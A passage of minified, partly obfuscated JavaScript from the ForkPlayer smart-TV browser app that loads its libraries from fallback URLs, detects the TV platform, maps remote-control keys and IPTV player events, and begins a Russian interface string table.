is_git=1; var ua=navigator.userAgent.toLowerCase(),booting=!0,JtvServ=null;if(typeof console!="object")console={};if(typeof console.log=="undefined")console.log=function(a){if(ua.match(/maple/))alert(a)};if(typeof console.trace=="undefined"){console.trace=function(a){}}
var librarys={libs:[{name:"jquery",important:1,url:["http://komivp.github.io.spiderxml.com/library/jquery-1.12.4.min.js","http://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js","http://browser.appinfo.su/library/jquery-1.12.4.min.js"]},{name:"json",important:1,url:["http://komivp.github.io.spiderxml.com/library/json.js","http://browser.appinfo.su/library/json.js","https://cdnjs.cloudflare.com/ajax/libs/json2/20160511/json2.min.js"]},{name:"underscore",important:1,require:"jquery",url:["http://komivp.github.io.spiderxml.com/library/underscore_1.8.3.js","http://browser.appinfo.su/library/underscore_1.8.3.js","https://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.8.3/underscore-min.js"]},{name:"md5",important:1,url:["http://komivp.github.io.spiderxml.com/library/md5.js","http://browser.appinfo.su/library/md5.js","https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.19.0/js/md5.min.js"]},{name:"langs",important:0,url:["http://komivp.github.io.spiderxml.com/library/langs.js","http://browser.appinfo.su/library/langs.js"]},{name:"guide",important:0,url:["http://85.17.30.89/common/jtv.js?v=6","http://46.36.220.208/common/jtv.js?v=6"]},{name:"webOS",important:0,url:["http://komivp.github.io.spiderxml.com/library/webOS.js","http://browser.appinfo.su/library/webOS.js"]},{name:"jw",important:0,url:["http://komivp.github.io.spiderxml.com/library/jwplayer_8.20.1.js","http://browser.appinfo.su/library/jwplayer_8.20.1.js"]}],exis:function(l){switch(l.name){case "jquery":return window.jQuery&&window.$;break;case "json":if(!window.JSON)JSON={};return window.JSON&&window.JSON.parse;break;case "underscore":return window._&&window._.random;break;case "langs":return window._lang&&window._lang.en;break;case "webOS":return!ua.match(/webos/)||!window.webOS;break;case "jw":return window.jwplayer;break;case "guide":return window.JtvServ;break;case "md5":return window.md5;break}
return 0},require:function(l){var c=this;if(l.require){if(!c.exis({name:l.require})){console.log("wait require for "+l.name);setTimeout(function(){console.log("refresh state require "+l.require);c.addlib(l)},1500);return 0}}
return 1},addlib:function(l){var c=this;if(!c.exis(l)){if(c.require(l)){l.num=l.num||0;console.log("start "+l.name+" "+l.num);var script=document.createElement('script');script.type='text/javascript';script.async=!0;script.src=l.url[l.num];script.onload=function(){clearTimeout(l.tout);l.name.ok=1;console.log("onload "+l.name)};script.onerror=function(){console.log("err load "+l.name+" "+l.num);clearTimeout(l.tout);if(typeof l.url[++l.num]!="undefined")c.addlib(l)};document.getElementsByTagName('head')[0].appendChild(script);l.tout=setTimeout(function(){console.log("timeout "+l.name);if(typeof l.url[++l.num]!="undefined")c.addlib(l)},4500)}}else{console.log("exists "+l.name)}},adds:function(){var c=this;for(var i=0;i<c.libs.length;i++){c.addlib(c.libs[i])}},loaded:function(){var c=this,n=0;for(var i=0;i<c.libs.length;i++){var l=c.libs[i];if(c.exis(l))n++;else{console.log("non exists "+l.name);if(l.important)return 0}}
if(n==c.libs.length)return 2;else return 1}}
librarys.adds();function gV(v,ind1){try{if(typeof v=="undefined")return"";if(v==null)return"";if(ind1!=null)return gV(v[ind1]);return v}catch(e){return""}}
var menuSel=0,menuSubSel=-2,doubleTimer=null,doubleEvent=0,mmes=0,runtime=0,oInset=[];var tvKey,uaJ="",xVol=80;var app_cors=!1,app_cors_once=!1,piframe=!1,hashR=!1,ifrrw=!1,ifrreaded=!1,xhr_referer=2;var tmpl_button='<div style="text-align:center;height:26px;margin:4px; font-size: 23px;   border-radius: 5px;     padding: 5px 16px 6px;    color: #111;    background: rgb(232, 240, 254);">$title</div>';var tmpl_info="<div style='position:absolute;top:550px;left:870px;width: 400px;'><div style='min-height: 80px;border-radius:5px;padding:5px; background: #546266;color: #fff;font-size:22px;width: 380px;'>info</div><span style='border: 10px solid transparent; border-bottom: 10px solid #546266; border-left: 10px solid #546266;margin-top:-20px;float:right;'></span></div>";var tmpl_box='<div style="width: 200px;margin:4px 2px; padding-left: 8px; padding-right: 8px; font-size:21px;word-break: break-word;">'+'<img src="$logo_30x30" style="float: left;width:41px;margin:3px;" />'+'		<div style="font-weight:bold;">'+'			$title'+'				</div><div style="catalog-card-creator">'+'					$description'+'				</div>'+'</div>';var tmpl_box2='<div style="font-style: italic;width: 230px;margin:4px 1px; padding-left: 8px; padding-right: 8px; font-size:21px;word-break: break-word;">'+'<img src="$logo_30x30" style="float: left;width:41px;margin:3px;" />'+'		<div style="font-weight:normal;">'+'			$title'+'				</div>'+'</div>';var tmpl_box3='<div style="height:50px;font-style: italic;width: 160px;margin:4px 2px; padding-left: 8px; padding-right: 8px; font-size:21px;    word-break: break-all;">'+'		<div style="font-weight:normal;">'+'			$title'+'				</div>'+'</div>';var labelStart="font-size: 90%;text-align: left;margin-left: -1%;margin-top:3px;    font-style: italic;";var startL=["omnibox","spider","fav","top","service"];var startN={"omnibox":"_FPOmnibox address bar and search_","spider":"_FPBeginner_","fav":"_FPFavorites_","top":"_FPHistory_","service":"_FPLocal_"};var startT={"omnibox":"","spider":"<div style='"+labelStart+"'>_FPBeginner_</div>","fav":"<div style='"+labelStart+"'>_FPFavorites_</div>","service":"<div style='"+labelStart+"'>_FPLocal_</div>","top":"<div style='"+labelStart+"'>_FPHistory_</div>"};var model="none",platform="";function onfly(){if($_("statbar2")==null){var div=document.createElement('div');div.id="statbar2";div.style.bottom="0px";div.style.height="20px";div.style.left="0px";div.style.display="none";div.style.overflow="hidden";div.style.width="100%";div.style.zIndex="0";div.style.fontSize="16px";div.style.position="absolute";div.style.whiteSpace="nowrap";document.getElementsByTagName('body')[0].appendChild(div)}}
if(typeof box_low2=="undefined")var box_low2=!1;if(typeof showfon=="undefined")var showfon=!0;if(typeof ipG=="undefined")var ipG="";if(typeof ipCountry=="undefined")var ipCountry="";var actual_img=!1;if(typeof version_local_files=="undefined")version_local_files=0;if(typeof version_local_js=="undefined")version_local_js=0;var box_client="ForkXMLviewer",pluginAPI=null;var is_tizen=0;if(document.location.href.indexOf("dns=")>0)var uadns=document.location.href.split("dns=")[1];else if(typeof dns!="undefined")uadns=dns;else uadns="";if(typeof Common!="undefined"){try{var widgetAPI=new Common.API.Widget();var pluginAPI=new Common.API.Plugin();plaginAudio=$_("pluginAudio");PL_NNAVI_STATE_BANNER_NONE=0;PL_NNAVI_STATE_BANNER_VOL=2;PL_NNAVI_STATE_BANNER_VOL_CH=2;console.log=function(a){alert(a)}}catch(e){pluginAPI=null}}
if(typeof andr!="undefined"){model=platform=uaJ="android-device";app_cors=!0}else if(typeof window.tizen!="undefined"){is_tizen=1;model=platform=uaJ="tizen";app_cors=!0}else if(pluginAPI!=null){model="maple";platform=uaJ="sams";app_cors=!0}else if(ua.match(/mag200/)){model=uaJ="mag";app_cors=!0}else if(ua.match(/dune/)){model=uaJ="dune";app_cors=!0}else if(ua.match(/android/)){model=uaJ="android"}else if(ua.match(/hisense/i))model=uaJ="hisense";else if(ua.match(/webos.tv-201(5|6|7|8|9)/)){uaJ="lgw2";model="webos"}else if(ua.match(/webos/)){uaJ="lgw";model="webos"}else if(ua.match(/webappmanager/)){model="lgusb";uaJ="lg"}else if(ua.match(/lg simplesmart/)){uaJ="lg";model="lgsimple"}else if(ua.match(/netcast|lge;/)){model="netcast";uaJ="lg"}else if(ua.match(/philips/))model=uaJ="ph";else if(ua.match(/technisat/)||ua.match(/sh4;.*presto/)){model=uaJ="spark";app_cors=!0;box_low2=!0;showfon=!1}else if(ua.match(/sony|bravia/))model=uaJ="sony";else if(ua.match(/skyworth/i))model=uaJ="skyworth";else if(ua.match(/iphone|ipad/i))model=uaJ="iphone";else if(ua.match(/vestel/i))model=uaJ="vestel";else if(ua.match(/playstation/)){model="sonyplaystation";uaJ="sony"}else if(ua.match(/bravia/)){model="sonybravia";uaJ="sony"}else if(ua.match(/inettvbrowser/))model=uaJ="sony";else if(ua.match(/viera/))model=uaJ="pa";else if(ua.match(/toshiba/))model=uaJ="ts";else if(ua.match(/polaroid|sharp|sraf/i)){model=uaJ="sharp"}else if(ua.match(/ucbrowser/))model="uc";else if(ua.match(/netrange/))model="netrange";else if(ua.match(/hbbtv/))model="hbbtv";else if(ua.match(/tcl/))model="tcl";else if(ua.match(/opera tv/))model="operatv";else if(ua.match(/qtembedded;/))model="qtembedded";else if(ua.match(/tizen/))model=uaJ="webtizen";else if(ua.match(/(smart-tv|maple|navi|lg|tv store)/)){model="yes"+ua.match(/(smart-tv|maple|navi|lg|tv store)/)[1].replace("-","_");models="yes"}else{platform="no"}
if(ua.match(/firefox\/2\.5/)){box_low2=!0;showfon=!1}
var lg_uid="",lg_model="",lg_v="";if(typeof glg_uid!="undefined"&&gV(glg_uid)!=""){platform=model="lgusb";lg_uid=glg_uid}
if(typeof loader_platform!="undefined"){if(loader_platform=="lg_webos"){model="lgusb";app_cors=!0;uaJ="lgw"}else if(loader_platform=="lg_netcast"){app_cors=!0;uaJ="lg";model="lgusb"}}else loader_platform="";var app_cors_referer=app_cors_orig=app_cors;if(platform=="tizen")app_cors_referer=0;if(platform!="sams"&&platform!="tizen"&&uaJ!="mag"&&uaJ!="dune")hashR=!0;var innerW,innerH;function getwh(){console.trace();if(platform=="sams"){innerW=1280;innerH=720}else{innerW=window.innerWidth
innerH=window.innerHeight}}
function $_(id){var x=document.getElementById(id);if(x==null&&document.getElementById("site")!=null){x=document.getElementById("site").contentWindow.document.getElementById(id)}
if(x==null&&document.getElementById("playerjs2")!=null){x=document.getElementById("playerjs2").contentWindow.document.getElementById(id)}
return x}
if(box_low==null)var box_low=!1;function css_w(n,m,k){return n}
function css_wh(n,m,k){return n}
var scmdf=!0;function loadinfo(s){try{statusbar(s)}catch(e){}}
if(platform=="sams"){try{tvKey=new Common.API.TVKeyValue();var VK_ENTER=tvKey.KEY_ENTER;var VK_PAUSE=tvKey.KEY_PAUSE;var VK_PAGE_UP=tvKey.KEY_CH_UP;var VK_PAGE_DOWN=tvKey.KEY_CH_DOWN;var VK_LEFT=tvKey.KEY_LEFT;var VK_UP=tvKey.KEY_UP;var VK_RIGHT=tvKey.KEY_RIGHT;var VK_DOWN=tvKey.KEY_DOWN;var VK_0=tvKey.KEY_0;var VK_1=tvKey.KEY_1;var VK_2=tvKey.KEY_2;var VK_3=tvKey.KEY_3;var VK_4=tvKey.KEY_4;var VK_5=tvKey.KEY_5;var VK_6=tvKey.KEY_6;var VK_7=tvKey.KEY_7;var VK_8=tvKey.KEY_8;var VK_9=tvKey.KEY_9;var VK_NUMPAD_0=96;var VK_NUMPAD_1=97;var VK_NUMPAD_2=98;var VK_NUMPAD_3=99;var VK_NUMPAD_4=100;var VK_NUMPAD_5=101;var VK_NUMPAD_6=102;var VK_NUMPAD_7=103;var VK_NUMPAD_8=104;var VK_NUMPAD_9=105;var VK_A=90;var VK_B=66;var VK_C=67;var VK_D=68;var VK_E=69;var VK_G=71;var VK_H=72;var VK_I=73;var VK_J=74;var VK_K=75;var VK_O=79;var VK_Q=81;var VK_R=82;var VK_S=83;var VK_T=84;var VK_U=85;var VK_V=86;var VK_W=87;var VK_X=88;var VK_Y=89;var VK_Z=90;var VK_RED=tvKey.KEY_RED;var VK_GREEN=tvKey.KEY_GREEN;var VK_YELLOW=tvKey.KEY_YELLOW;var VK_BLUE=tvKey.KEY_BLUE;var VK_FAST_FWD=tvKey.KEY_FF;var VK_REWIND=tvKey.KEY_RW;var VK_STOP=tvKey.KEY_STOP;var VK_PLAY=tvKey.KEY_PLAY;var VK_MUTE=tvKey.KEY_MUTE;var VK_INFO=tvKey.KEY_INFO;var VK_BACK=tvKey.KEY_RETURN;var VK_EXIT=tvKey.KEY_EXIT;var VK_TOOLS=tvKey.KEY_TOOLS;var KEY_VOLUME_PLUS=77;var KEY_VOLUME_MINUS=76}catch(e){platform="tizen"}}
if(platform!="sams"){var VK_ENTER=13;var VK_PAUSE=19;var VK_PAGE_UP=33;var VK_PAGE_DOWN=34;var VK_LEFT=37;var VK_UP=38;var VK_RIGHT=39;var VK_DOWN=40;var VK_HID_BACK=8;var VK_HID_HOME=36;var VK_HID_END=35;var VK_HID_INSERT=45;var VK_HID_DEL=46;var VK_HID_ESC=461;var VK_HID_CTRL=17;var VK_HID_ALT=18;var VK_HID_RT_ALT=21;var VK_CAPS_LOCK=20;var VK_SHIFT=16;var VK_LANG_SEL=229;var VK_0=48;var VK_1=49;var VK_2=50;var VK_3=51;var VK_4=52;var VK_5=53;var VK_6=54;var VK_7=55;var VK_8=56;var VK_9=57;var VK_NUMPAD_0=96;var VK_NUMPAD_1=97;var VK_NUMPAD_2=98;var VK_NUMPAD_3=99;var VK_NUMPAD_4=100;var VK_NUMPAD_5=101;var VK_NUMPAD_6=102;var VK_NUMPAD_7=103;var VK_NUMPAD_8=104;var VK_NUMPAD_9=105;var VK_GRAVE=192;var VK_DASH=189;var VK_EQUAL=187;var VK_BACK_SLASH=220;var VK_LEFT_BLACKET=219;var VK_RIGHT_BLACKET=221;var VK_SEMICOLON=186;var VK_APOSTROPHE=222;var VK_COMMA=188;var VK_PERIOD=190;var VK_SLASH=191;var VK_SPACE_BAR=32;var VK_A=65;var VK_B=66;var VK_C=67;var VK_D=68;var VK_E=69;var VK_F=70;var VK_G=71;var VK_H=72;var VK_I=73;var VK_J=74;var VK_K=75;var VK_L=76;var VK_M=77;var VK_N=78;var VK_O=79;var VK_P=80;var VK_Q=81;var VK_R=82;var VK_S=83;var VK_T=84;var VK_U=85;var VK_V=86;var VK_W=87;var VK_X=88;var VK_Y=89;var VK_Z=90;var VK_RED=403;var VK_GREEN=404;var VK_YELLOW=405;var VK_BLUE=406;var VK_REWIND=412;var VK_STOP=413;var VK_PLAY=415;var VK_FAST_FWD=417;var VK_INFO=457;var VK_BACK=461;var VK_LGE_MAGIC_VOICE=1015;var KEY_VOLUME_PLUS=999;var KEY_VOLUME_MINUS=998}
if(uaJ=="spark"){var VK_PAUSE=66;var VK_PAGE_UP=7;var VK_PAGE_DOWN=8;var VK_RED=112;var VK_GREEN=113;var VK_YELLOW=405;var VK_BLUE=115;var VK_FAST_FWD=65;var VK_REWIND=70;var VK_STOP=10;var VK_PLAY=80;var VK_MUTE=78;var VK_INFO=116;var VK_BACK=117;var VK_LGE_MAGIC_VOICE=1015;var KEY_VOLUME_PLUS=77;var KEY_VOLUME_MINUS=76}
if(uaJ=="sharp"){VK_PAGE_UP=427;VK_PAGE_DOWN=428}
if(platform=="tizen"){VK_RED=403;VK_GREEN=404;VK_YELLOW=405;VK_BLUE=406;VK_PAGE_UP=427;VK_PAGE_DOWN=428;VK_BACK=0;VK_MUTE=449;VK_PAUSE=19;VK_REWIND=412;VK_STOP=413;VK_PLAY=415;VK_FAST_FWD=417}
var resolution_prefix=null,resolution_portal="",mag_dop_top="",stb;if(uaJ=="dune"){var VK_RED=193;var VK_GREEN=194;var VK_YELLOW=195;var VK_BLUE=196;var VK_FAST_FWD=205;var VK_REWIND=204;var VK_STOP=178;var VK_PAUSE=218;var VK_INFO=199;var VK_EXIT=18;var KEY_VOLUME_PLUS=175;var KEY_VOLUME_MINUS=174;if(typeof document.referrer!="undefined"){if(document.referrer.length>5)resolution_portal=document.referrer}}
if(uaJ=="mag"){var VK_RED=112;var VK_GREEN=113;var VK_YELLOW=114;var VK_BLUE=115;var VK_FAST_FWD=70;var VK_REWIND=66;var VK_STOP=83;var VK_PAUSE=82;var VK_MUTE=78;var VK_INFO=89;var VK_EXIT=27;var KEY_VOLUME_PLUS=107;var KEY_VOLUME_MINUS=109;try{stb=gSTB;if(window.innerWidth>720){resolution_prefix=null}else if(window.innerHeight<576){resolution_prefix=576}else{resolution_prefix=576}
stb.EnableServiceButton(!0);stb.InitPlayer();if(typeof document.referrer!="undefined"){if(document.referrer.length>5)resolution_portal=document.referrer;else resolution_portal="file:///home/web/services.html"}
var startM=0,mrout,prop={};var stbEvent={onEvent:function(event){if(event==4){iptv_succed=!0;if(startM>0){stb.SetPosTime(startM);startM=0}else videoLoad("off",-1);prop.w=stb.GetVideoInfo().match(/pictureWidth:(.*?),/)[1];prop.h=stb.GetVideoInfo().match(/pictureHeight:(.*?),/)[1];if(prop.w>0&&prop.h>0)lI010lp_Z1l1O0Ypr(prop.w+"x"+prop.h+" _FPProporcii_: "+kjtYpr.GL.xmode);return}
if(event==7){}
if((event==1||event==5)&&l0I110IO1SyqII1lI1Ypr&&$_("vk_audio").style.display=="block"&&handler!="player"&&!stopped){clearTimeout(mrout);stb.Stop();stopped=!0;mrout=setTimeout("keyHandler({'keycode':VK_FAST_FWD});",2000);return}
if(stopped||handler=="menu"||rek_url!=""||kjtYpr.GL.timeoutiptv>55)return;if(event==1||event==5){if((!pstream||is_vod())&&(curTime>1||startM>0)){if(totalTime-curTime<5)return;stb.Stop();stopped=!0;showPlayer();videoLoad("on");clearTimeout(mrout);if(curTime>1)startM=curTime;mrout=setTimeout(function(){stb.Stop();l0OIQIl1OI0IlI0lIYpr(playUrl,!0,startM)},3000);lI010lp_Z1l1O0Ypr("_FPSoedineniePrervano_!"+startM+"sec "+playUrl);return}
iptv_retry++;if(pstream&&iptv_succed){stopped=!0;setTimeout("stb.Stop();videoLoad('on');l0OIQIl1OI0IlI0lIYpr(playUrl,true);",1500);lI010lp_Z1l1O0Ypr("_FPOshibka_! _FPPodkluchenie_ "+iptv_retry+"...");return}
if(iptv_retry>4){setTimeout("if(!stopped) l1llOQI10lW1l_II101Ypr();",1500)}else{if(!plmini_on){t=" _FPpodklucheniya_";lifeN=0;lifeSec=-1;stb.Stop();showPlayer();videoLoad("on");stopped=!0;setTimeout("stb.Stop();l0OIQIl1OI0IlI0lIYpr(playUrl,true,startM);",1000);lI010lp_Z1l1O0Ypr("_FPOshibka_"+t+"! _FPPodkluchenie_  "+(iptv_retry+1)+"...")}}}},event:0};window.moveTo(0,0);stb.SetVolume(xVol)}catch(e){}}
if(document.location.href.indexOf("idemag")>0){uaJ="mag";resolution_prefix=576}
if(document.location.href.indexOf("idemag720")>0){uaJ="mag";resolution_prefix=null}
if(typeof _lang=="undefined")var _lang={};_lang.ru={"_name":"Русский","Beginner":"Начало","_powered":"","Transparency in the interface":"Прозрачности в интерфейсе","Sign in to sync browser data across devices":"Войдите, чтобы синхронизировать данные браузера на разных устройствах","Enter search query or site URL, playlist XML / M3U":"Введите поисковый запрос или URL-адрес сайта, плейлиста XML / M3U","My account":"Мой аккаунт","Profile":"Профиль","enter":"войти","Set name":"Задать имя","Display time":"Показывать часы","mysets":"моих настроек","Add stripes":"Добавить полосы","Zakladki":"Закладки","zakladki":"закладки","Vneshnie":"Внешние","Vnutr":"Внутренние","Istoriya":"История","poiskov":"поисков","Raznoe":"Разное","Seriali":"Сериалы","Filmi":"Фильмы","Tema":"Тема","History":"История","Adjust weather":"Настроить погоду","Server not response":"Сервер не отвечает","Open closed tab":"Открыть закрытую вкладку","Animate snow":"Анимация снега","Zakladki":"Закладки","Your country":"Страна использ. прилож.","Oneaudiotrack":"Одна звуковая дорожка","OpredelenieDns":"Определение ДНС","RegistraciyaVseti":"Регистрация в сети","SchitivanieNastroek":"Считывание настроек","Inicializaciya":"Инициализация","Zoom":"Масштаб","Copied denied by author playlist":"Автор плейлиста запретил копирование","Timeout":"Таймаут","pleera":"плеера","Zagruzka":"Загрузка","Interface":"интерфейса","menu":"меню","Cancel":"Отмена","Size data":"Размер данных","data from server":"данных с сервера","Error download data, load local settings":"Ошибка получения данных, загружены локальные настройки","Menu":"Меню","Store data":"Хранить данные","Save and":"Сохранить и","Saving data to the server every 5 minutes or by pressing the Menu button Save and":"Сохранение данных на сервер происходит каждые 5 минут или по нажатию кнопки Меню Сохранить и","On Server":"На сервере","Local":"Локально","ChtenieNastroekPoiska":"Чтение настроек поиска","Vozobnovlenie":"Возобновление","Soobshestvo":"Сообщество","Go to settings":"Перейти к настройкам","Add search engine":"Добавить поисковик","Vash":"Ваш","macAdres":"мак-адрес","404NotFound":"Ошибка 404. Такого файла не существует","HotiteIskatVdrugihMestah":"Хотите искать это других местах","Vospolzuites":"Воспользуйтесь","NaitiVglobPoiske":"Найти в поисковых системах","GlobPoisk":"Глобальный поиск","DobroPozhalovat":"Новая вкладка","Frequently Visited Sites":"Часто посещаемые сайты","ViberiteChtoIskat":"Выберите что искать","ViberiteEpg":"Выберите нужный ЕПГ для канала","Stranica":"Страница","ZdesPusto":"Здесь пусто","PoiskPrervan":"Поиск прерван","UdalenaGrupa":"Была удалена начальная группа","StartovoeMenu":"Стартовое меню","Sync":"Синхронизация","Export":"Экспорт","SaveSetServ":"Сохранить настройки на сервере","Import":"Импорт","nastrdruga":"настроек","VvLogDr":"Введите логин пользователя от сайта","PolNastrDr":"Получить настройки пользователя","Are you sure":"Вы уверены","Delete":"Удалить","EtoMozhUd":"Это может удалить текущие настройки виджета","Steret":"Стереть","NastroikiPrilozheniya":"Настройки приложения","NastrStartMenu":"Настройки начальной страницы","NastrGlPoisk":"Поисковая система","DobavlenoV":"Добавлено в","DlVklPer":"Для включения перейдите в Настройки / Настройки поиска /","ZaklUzheEst":"Такая закладка уже есть","vstm":"в стартовом меню","UdMsNsM":"Удалить из стартового меню можно в <br>Настройки / Настройки Стартового меню","Udalit":"Удалить","Clear":"Очистить","Vstavit":"Вставить","Kopirovat":"Копировать","Ssilka":"Ссылка","NazhmVpravo":"Нажмите вправо","chud":"чтобы удалить","Vkl":"Включено","Otkl":"Отключено","Vkl.":"Вкл.","Otkl.":"Откл.","Button":"Кнопка","PeremV":"Переместить в","IstOchishena":"История очищена","PrRabStogoMesta":"Продолжать работу с того же места","Nastroiki":"Настройки","ChPoyas":"Часовой пояс","Time offset":"Смещение времени","Perekl":"Перекл.","KachVideo":"Качество видео","KolStrok":"Количество строк","Videopleer":"Видеоплеер","pleer":"плеер","Sortirovka":"Сортировка","Rezhim":"Режим","NachGrupa":"Начальная группа","RodKontr":"Родительский контроль","FonRisunok":"Фоновый рисунок","Donate to browser development in Profile":"Поддержите разработку браузера в Профиле","Mac address":"Мак адрес","YarkFon":"Яркость фона (Произв.)","CvetText":"Цвет текста","VkKod":"Вконтакте код","MoiUvedoml":"Мои уведомления","PolnSbrosNastr":"Полный сброс настроек","Yazik":"Язык","PereklM":"Переключение между","DelMuvT":"Делайте меньше для увеличения текста","TvpPu":"Тип видео плеера по умолчанию","TipPu":"Тип плеера IPTV по умолчанию","Sort":"Сортировать","Enabling can slow opening iptv lists":"Включение может замедлить открытие списков iptv","KartVKart":"Картинка в картинке<br>Автоматический предпросмотр видео в маленьком окошке (при отключенной опции PIP для выбранного видео включить можно кнопкой плей на пульте)","vospr":"воспроизведения","prilozheniya":"приложения","RemoteInfo":"RemoteFork это вспомогательная программа для <br>— запуск с  некоторых  ресурсов (торренты, moonwalk)<br>— загрузка плейлистов с компьютера во внешние закладки без регистрации на сайте<br>— доступ к плейлистам,файлам компьютера с ForkPlayer<br>— плагины, работа сайтов требующих ремотефорка, торрент трекеры<br>Для включения необходимо скачать и запустить программу Remote Forkplayer на компьютере или андроиде подключенному к тому же роутеру что и ТВ<br>Ссылка на скачивание","PrivVk":"Привязка своего аккаунта Вконтакте","Font":"Шрифт","polzovatelya":"пользователя","SsilkaVkKod":"Ссылка где можно получить код привязки","VashUvNp":"Ваши уведомления, например пароль от сайта","ZsIsN":"Загрузка на сервер или скачивание всех настроек виджета","zaklIist":"закладок и истории","VvKodPr":"Введите код привязки ВК","Auto":"Авто","Tolko":"Только","DlyaVsV":"Для всех видео","BistrPoisk":"Быстрый поиск","Parol":"Пароль","parol":"пароль","to":"до","mo":"мес","DlDostVv":"Для доступа введите","DeistDoV":"действует до выхода в стартовое меню<br>Или нажмите Назад для отмены","poumolch":"по умолчанию","Adult content":"Взрослый контент","Third-party content":"Сторонний контент","SmIotk":"Сменить или отключить","moV":"можно в","My bookmarks and history":"Мои закладки и история","RazblVkl":"Разблокировать вкладку","EtaVklBzabl":"Эта вкладка была заблокирована","DlRvIn":"Для разблокировки выделите ее и нажмите","VvedNov":"Введите новый","DlUdVved":"Для удаления введите","ZablVkl":"Заблокировать вкладку","UstSart":"Установить стартовой","UdIzSt":"Удалить из стартовой","ustanovit":"установить","Media":"Медиа","Vstroenniy":"Встроенный","OtmNeProsm":"Отметить непросмотренным","OtmProsm":"Отметить просмотренным","DobavVglob":"Добавить в поисковые системы","Peredvinut":"Передвинуть","VijtiV":"Выйти в","EXIT":"ВЫХОД","listSservera":"лист с сервера","DobavitV":"Добавить в","Use in search":"Использовать в поиске","OchistitIstoriyu":"Очистить историю","ObnovitStranicy":"Обновить страницу","izZakladok":"из закладок","PeremV":"Переместить в","Clear cache":"Очистить кеш","OshibkaSohrDannih":"Ошибка сохранения данных","OshibkaChDannih":"Ошибка чтения данных","ustanolen":"установлен","VineSmP":"Вы не сменили пароль 0000!<br><i>Рекомендуем сменить пароль Родительского контроля для защиты от детей","ParolDeistDk":"Пароль действует до выхода в стартовое меню! Не забудьте выйти в стартовое меню по окончанию","nePodhodit":"не подходит","PrilUstSh":"Приложения устанавливаются в смартхаб","IzvFailovNo":"Извините, файлов не обнаружено","sIst":"с источника","PerPoAdr":"Перейти по адресу","OshibkaParsPl":"Ошибка парсинга страницы","OshibkaObrabotki":"Ошибка обработки","Informaciya":"Информация","Click now right to go to the category selection":"Нажмите сейчас вправо для перехода к выбору категории","DlyaPerNsp":"Для перехода на следующую страницу нажмите кнопку вправо","infodns":"Используйте RemoteFork<br>(в настройках, необходим компьютер или андроид) для более быстрой навигации по этому сайту","January":"Января","February":"Февраля","March":"Марта","April":"Апреля","May":"Мая","June":"Июня","Jule":"Июля","August":"Августа","September":"Сентября","October":"Октября","November":"Ноября","December":"Декабря","Monday":"Пн","Tuesday":"Вт","Wednesday":"Ср","Thursday":"Чт","Friday":"Пт","Saturday":"Сб","Sunday":"Вс","Md":"Пн","Tu":"Вт","Wd":"Ср","Th":"Чт","Fr":"Пт","St":"Сб","Sn":"Вс","Subtitles":"Субтитры","Oshibka":"Ошибка","polVr":"получения времени","UspIdPolz":"Успешно!<br>ID пользователя","NeobhUstIzap":"Необходимо установить и запустить на компьютере программу","SbrositNastr":"Сбросить настройки","VsaeZaklUd":"Все закладки, история, настройки будут удалены","PrevLimOzh":"Превышен лимит ожидания","Favorites":"Избранное","opredDns":"определения ДНС","Configuring search":"Настройка поиска","Configuring start menu":"Настройка старт. меню","Top queries":"Топ запросов","Enter search query or URL":"Введите поисковый запрос или URL","VvediteText":"Введите текст","PustayaSsilka":"Пуcтая ссылка","Obrabotka":"Обработка","Recover my account data":"Восстановить данные с аккаунта","NetOtvetaUbedRemote":"Нет ответа! Убедитесь что включен RemoteFork","PovtorPop":"Повторная попытка","ProvSostRem":"Проверьте состояние RemoteForkplayer на компьютере","polSsilki":"получения ссылки","EtoStList":"Это стартовый плейлист","NeskEl":"Несколько элементов","Add all links":"Добавить все ссылки","Add a search engine":"Добавить поисковую систему","stMenuSkr":"стартового меню  скрыто<br>Включить их можно в Настройках / Настройка старт. меню","VvedAdrPl":"Введите адрес","SudaMozhVv":"Введите адрес плейлиста M3U, XML","Vkontakte":"Вконтакте","VashaStrVk":"Ваша страница вконтакте","PrivVk":"Привязать ВК","KodPolZd":"Код получать здесь","FailKnR":"Файлы вашего компьютера. (Необходимо запустить RemoteForkplayer на компьютере и включить","ScachRemoteMozh":"Скачать RemoteForkplayer можно по адресу","PamyatTv":"Память ТВ","Navigaciya":"Навигация","VverhVniz":"Вверх / Вниз","Sohranit":"Сохранить","VPLEER":"В ПЛЕЕР","Vnutr":"Внутр","Vnesh":"Внешн","StartMenu":"Старт меню","SleduushayaStr":"Следующая стр","Ostanovleno":"Остановлено","Iskat":"Искать","Podkluchenie":"Соединение","SoedineniePrervano":"Соединение прервано","Preferred server":"Предпочитаемый сервер","soedineniya":"соединения","podklucheniya":"подключения","SbrosVipolnenPerezpusk":"Сброс настроек приложения выполнен!<br>Перезапуск виджета","Prodolzhit":"Продолжить","Otmena":"Отмена","Live search":"Живой поиск","Screensaver":"Заставка","Confirm action":"Подтвердите действие","To cancel the search, press again":"Для отмены поиска нажмите еще раз","VseRavnoProdolzhit":"Все равно продолжить","parsingaVideossilki":"парсинга видеоссылки","NevernayaSsilka":"Неверная ссылка","Proporcii":"Пропорции","OpciiEkrana":"Опции экрана","OchishPamyati":"Очищ. памяти","min":"мин","Kachestvo":"Качество","Nedostupno":"Недоступно","New inset":"Новая вкладка","New private inset":"Новая приватная вкладка","SeichasNedostupno":"Сейчас недоступно","Shirina":"Ширина","Visota":"Высота","Buffer":"Буффер","Mb":"Мб","ZvukDorozhka":"Звук. дорожка","Ekran":"Экран","Gromkost":"Громкость","Tip":"Тип","Date":"Дата","Album":"Альбом","Original":"Оригинал","Rastyanut":"Растянуть","Ruchnoi":"Ручной","VozobnovitNa":"Возобновить","Posledovatelno":"Последовательно","Povtoryat":"Повторять","odin":"один","vse":"все","DostupRazreshen":"Доступ разрешен","REKLAMA":"РЕКЛАМА","PereadresaciyaNaFail":"Переадресация на файл","Vneshniy":"Внешний","NplI101Q1CGOl1lYpr":"Не подходит ТВ программа","VoVremProsNazh":"Во время просмотра IPTV канала нажмите","VmEmVp":"В Меню -> ЕПГ код можно выбрать подходящую","dVp":"для выбора подходящей","VmVpostBiCe":"Вместо видео постоянно белый или черный экран?<br><i>Попробуйте другой тип","HotChtVfon":"Хотите чтобы видео играло в фоне? Нажмите","vVrPrVid":"во время проигрывания видео","Close tab":"Закрыть вкладку","KnInfoPerRezh":"Кнопка инфо на пульте переключает режим отображения информации при просмотре видео","Video":"Видео","video":"видео","nePodderzhivaetsya":"не поддерживается","DrugZvDorNet":"Других звуковых 